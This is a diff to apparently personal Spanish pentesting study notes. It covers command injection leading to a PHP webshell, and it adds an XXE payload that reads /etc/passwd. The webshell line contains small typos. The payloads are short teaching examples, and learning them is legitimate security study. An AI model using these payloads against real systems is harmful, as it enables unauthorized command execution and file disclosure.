@@ -390,7 +390,13 @@ Anthares101@kali:~$ sqlmap -D DB --sql-query "select id,password,...,... from TA
 
 # El parámetro --tamper=space2comment permite intentar saltarse ciertos firewalls (WAF)
 ```
-- **RCE (Ejecución de comandos remotos):** En principio, si se esta poniendo el código directamente: `shell_exec('ping 8.8.8.8');` siendo la ip lo que el usuario mete, si en vez de eso ponemos `;ls` pues aunque `ping` de error ejecuta el comando `ls`. Una vez detectada la vulnerabilidad podriamos ejecutar una WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. Si nos vamos a `shell1.php`, con el parámetro de la url `cmd` podremos ejecutar los comandos que nos dé la gana.
+- **RCE (Ejecución de comandos remotos):** En principio, si se esta poniendo el código directamente: `shell_exec('ping 8.8.8.8');` siendo la ip lo que el usuario mete, si en vez de eso ponemos `;ls` pues aunque `ping` de error ejecuta el comando `ls`. Una vez detectada la vulnerabilidad podriamos ejecutar una WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. Si nos vamos a `shell1.php`, con el parámetro de la url `cmd` podremos ejecutar los comandos que nos dé la gana
+- **XXE (XML External Entity):** Abusa las características de XML para interactuar con el backend de una aplicación y leer por ejemplo ficheros del sistema. Un payload podría ser:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
 - **Metodologia OWASP para testear seguridad en la web:** OWASP broken web application (Para practicar a atacar paginas y esas cosas) 
 
 # Ingeniería inversa y exploit de binarios
